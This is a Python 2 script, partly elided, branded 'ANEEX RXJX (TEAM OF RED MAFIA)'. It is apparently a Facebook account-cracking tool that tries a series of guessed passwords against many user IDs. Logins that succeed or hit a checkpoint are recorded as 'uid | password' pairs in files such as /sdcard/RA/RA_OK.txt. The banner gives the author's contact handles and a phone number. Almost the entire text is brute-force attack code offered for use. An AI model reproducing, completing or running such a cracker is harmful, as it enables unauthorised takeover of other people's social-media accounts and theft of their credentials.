# Author : ANEEX RXJX (TEAM OF RED MAFIA)
# Lang used : python2
...
__author__ = 'ANEEX RXJX (TEAM OF RED MAFIA)'
__copyright = 'All rights reserved . Copyright  ANEEX RXJX'
...
| | |____| |___| | | | ||____|  |____|| |
| |              | | | |              | |
| '--------------' | | '------------- [1;97m*\n\x1b[1;93m      AUTHER    :     ANEEX RXJX TEAM OF RED MAFIA\n\x1b[1;96m      GITHUB    :     /ANEEX12\n\x1b[1;95m        WP      :     +923156675789[1;94m         FB      :     /ANEEXAWAIX0011\n\x1b[1;97m *******************************************\n\x1b[1;98m          Send id in messenger for approval\n\x1b[1;97m *******************************************\n'
...
def log_menu_s():
    s = raw_input(' \x1b[1;93m\xe2\x95\xb0\xe2\x94\x80ANEEX RXJX\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu_s():
    ms = raw_input('\x1b[1;92m\xe2\x95\xb0\xe2\x94\x80ANEEX RXJX\xe2\x9e\xa4 ')
    if ms == '1':
        auto_crack()
    elif ms == '2':
        os.system('clear')
...
def a_s():
    ...
    if a_s == '1':
        ...
        print ''
        a_s()
    print ' Total ANEEX RXJZ (TEAM OF RED MAFIA): ' + str(len(id))
    time.sleep(0.5)
    print ' \x1b[1;93m Process Has Been Started '
    time.sleep(0.5)
    print ''
    print 47 * '-'
    print '\t\x1b[1;32mANEEX RXJX (TEAM OF RED MAFIA )\x1b[0;97m'
    print 47 * '-'
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass1
                ok = open('/sdcard/RA/RA_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass1
                cp = open('RA_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass2
                    ok = open('/sdcard/RA/RA_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass2
                    cp = open('RA_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass3
                        ok = open('/sdcard/RA/RA_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass3
                        cp = open('RA_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass4
                            ok = open('/sdcard/RA/RA_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass4
                            cp = open('RA_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass5
                                ok = open('/sdcard/RA/RA_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass5
                                cp = open('RA_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass6
                                    ok = open('/sdcard/RA/RA_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass6
                                    cp = open('RA_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass7
                                        ok = open('/sdcard/RA/RA_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass7
                                        cp = open('RA_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[RA-OK] ' + uid + ' | ' + pass8
                                            ok = open('/sdcard/RA/RA_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;93m[RA-CP] ' + uid + ' | ' + pass8
                                            cp = open('RA_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
